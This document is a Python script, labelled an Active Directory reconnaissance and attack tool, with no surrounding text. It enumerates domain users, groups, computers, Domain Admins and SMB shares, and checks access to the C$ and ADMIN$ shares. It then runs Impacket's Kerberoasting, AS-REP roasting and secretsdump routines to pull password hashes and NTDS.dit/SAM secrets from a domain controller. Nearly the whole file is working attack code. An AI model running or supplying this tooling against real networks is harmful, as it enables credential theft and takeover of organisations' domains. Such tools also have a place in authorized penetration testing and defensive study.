import argparse
from ldap3 import Server, Connection, ALL, NTLM, ANONYMOUS
from impacket.smbconnection import SMBConnection
import subprocess

def connect_to_ad(server_address, domain=None, username=None, password=None):
    server = Server(server_address, get_info=ALL)

    if username and password:
        conn = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM)
    else:
        conn = Connection(server, authentication=ANONYMOUS)

    if not conn.bind():
        print(f"Failed to connect to {server_address}.")
        print(f"Error: {conn.result['description']}")
        exit()
    
    bind_type = 'authenticated' if username and password else 'anonymous'
    print(f"Successfully connected to {server_address} using {bind_type} bind.")
    return conn

def parse_domain_to_search_base(domain):
    """
    Convert a domain name like 'example.com' into an LDAP search base like 'dc=example,dc=com'.
    """
    parts = domain.split('.')
    search_base = ','.join([f'dc={part}' for part in parts])
    return search_base

def enumerate_ldap_objects(conn, search_base):
    print(f"\n[+] Enumerating LDAP objects with search base: {search_base}")

    # Enumerate Domain Info
    conn.search(
        search_base=search_base,
        search_filter='(objectClass=domain)',
        attributes=['*']
    )
    print("\n[+] Domain Information:")
    for entry in conn.entries:
        print(entry)

    # Enumerate Users
    conn.search(
        search_base=search_base,
        search_filter='(objectClass=user)',
        attributes=['sAMAccountName', 'displayName', 'memberOf', 'userAccountControl']
    )
    print("\n[+] Users:")
    for entry in conn.entries:
        print(f"User: {entry.sAMAccountName}, Name: {entry.displayName}, MemberOf: {entry.memberOf}")

    # Enumerate Groups
    conn.search(
        search_base=search_base,
        search_filter='(objectClass=group)',
        attributes=['cn', 'member', 'groupType']
    )
    print("\n[+] Groups:")
    for entry in conn.entries:
        print(f"Group: {entry.cn}, Members: {entry.member}")

    # Enumerate Computers
    conn.search(
        search_base=search_base,
        search_filter='(objectClass=computer)',
        attributes=['cn', 'operatingSystem', 'operatingSystemVersion', 'dNSHostName']
    )
    print("\n[+] Computers:")
    for entry in conn.entries:
        print(f"Computer: {entry.cn}, OS: {entry.operatingSystem}, Version: {entry.operatingSystemVersion}")

    # Enumerate Admins
    conn.search(
        search_base=search_base,
        search_filter=f'(&(objectCategory=person)(objectClass=user)(memberOf=cn=Domain Admins,cn=Users,{search_base}))',
        attributes=['sAMAccountName', 'displayName', 'memberOf']
    )
    print("\n[+] Domain Admins:")
    for entry in conn.entries:
        print(f"Admin: {entry.sAMAccountName}, Name: {entry.displayName}")

def enumerate_netbios_and_smb(server_address, username=None, password=None, domain=None):
    print("\n[+] Enumerating NetBIOS and SMB shares...")
    try:
        smb_conn = SMBConnection(server_address, server_address)
        if username and password:
            smb_conn.login(username, password, domain)
        else:
            smb_conn.login('', '')

        print(f"Connected to SMB on {server_address}")

        # Enumerate SMB shares
        shares = smb_conn.listShares()
        print("\n[+] SMB Shares:")
        for share in shares:
            print(f"Share Name: {share['shi1_netname'][:-1]}, Type: {share['shi1_type']}, Comment: {share['shi1_remark']}")

        # Enumerate NetBIOS names
        netbios_names = smb_conn.getServerName()
        print(f"\n[+] NetBIOS Names: {netbios_names}")

        # Enumerate SMB sessions
        print("\n[+] Enumerating SMB Sessions:")
        try:
            sessions = smb_conn.listSessions()
            for session in sessions:
                print(f"Session ID: {session['sessionID']}, Username: {session['username']}, IP: {session['ip']}")
        except Exception as e:
            print(f"Could not enumerate SMB sessions: {e}")

        # Enumerate connected users
        print("\n[+] Enumerating Connected Users:")
        try:
            for user in smb_conn.listConnections():
                print(f"User: {user['username']}, Share: {user['share']}, Time: {user['startTime']}")
        except Exception as e:
            print(f"Could not enumerate connected users: {e}")

        # Check access to common shares
        print("\n[+] Checking Access to Common Shares:")
        common_shares = ['C$', 'ADMIN$', 'IPC$']
        for share in common_shares:
            try:
                smb_conn.listPath(share, '*')
                print(f"Access to {share}: Allowed")
            except Exception as e:
                print(f"Access to {share}: Denied ({e})")

    except Exception as e:
        print(f"Error enumerating NetBIOS/SMB shares: {e}")

def kerberoasting(target, domain, username, password):
    print("\n[+] Performing Kerberoasting...")
    try:
        # Use Impacket's GetUserSPNs tool to perform Kerberoasting
        command = [
            'python3', 'GetUserSPNs.py',
            f'{domain}/{username}:{password}',
            '-dc-ip', target, '-request'
        ]
        result = subprocess.run(command, capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"Kerberoasting failed: {e}")

def asrep_roasting(target, domain, username):
    print("\n[+] Performing AS-REP Roasting...")
    try:
        # Use Impacket's GetNPUsers tool for AS-REP Roasting
        command = [
            'python3', 'GetNPUsers.py',
            f'{domain}/', '-no-pass', '-usersfile', username, '-dc-ip', target
        ]
        result = subprocess.run(command, capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"AS-REP Roasting failed: {e}")

def dump_secrets(server_address, username, password, domain):
    print("\n[+] Dumping Secrets (NTDS.dit, SAM)...")
    try:
        # Using subprocess to call the secretsdump.py script
        command = [
            'python3', 'secretsdump.py',
            f'{domain}/{username}:{password}@{server_address}'
        ]
        result = subprocess.run(command, capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"Secrets dumping failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="Comprehensive Active Directory Reconnaissance and Attack Script")
    parser.add_argument('--server', required=True, help='LDAP/DC server address')
    parser.add_argument('--username', help='Username for LDAP/SMB bind (optional for anonymous)')
    parser.add_argument('--password', help='Password for LDAP/SMB bind (optional for anonymous)')
    parser.add_argument('--domain', required=True, help='Domain for LDAP/SMB bind in format like example.com')
    parser.add_argument('--kerberoast', action='store_true', help='Perform Kerberoasting')
    parser.add_argument('--asrep', help='Perform AS-REP Roasting with specified user file')
    parser.add_argument('--dump', action='store_true', help='Dump secrets using secretsdump')
    args = parser.parse_args()

    if args.username and not args.password:
        print("Password must be provided if username is specified.")
        exit()

    # Parse domain to search base
    search_base = parse_domain_to_search_base(args.domain)

    # Connect to AD and perform LDAP enumeration
    conn = connect_to_ad(args.server, args.domain, args.username, args.password)
    enumerate_ldap_objects(conn, search_base)
    conn.unbind()

    # Enumerate NetBIOS and SMB shares
    enumerate_netbios_and_smb(args.server, args.username, args.password, args.domain)

    # Perform Kerberoasting if specified
    if args.kerberoast:
        kerberoasting(args.server, args.domain, args.username, args.password)

    # Perform AS-REP Roasting if specified
    if args.asrep:
        asrep_roasting(args.server, args.domain, args.asrep)

    # Dump secrets if specified
    if args.dump:
        dump_secrets(args.server, args.username, args.password, args.domain)

if __name__ == "__main__":
    main()
